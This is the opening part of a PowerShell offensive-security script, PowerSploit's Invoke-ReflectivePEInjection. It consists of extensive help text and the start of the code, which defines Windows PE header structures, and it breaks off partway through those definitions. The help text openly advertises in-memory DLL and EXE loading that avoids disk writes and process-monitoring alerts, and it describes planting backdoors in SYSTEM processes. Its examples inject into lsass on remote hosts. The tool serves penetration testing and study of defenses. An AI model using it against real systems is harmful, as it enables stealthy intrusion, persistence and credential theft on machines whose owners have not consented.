
function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.

.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.

.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
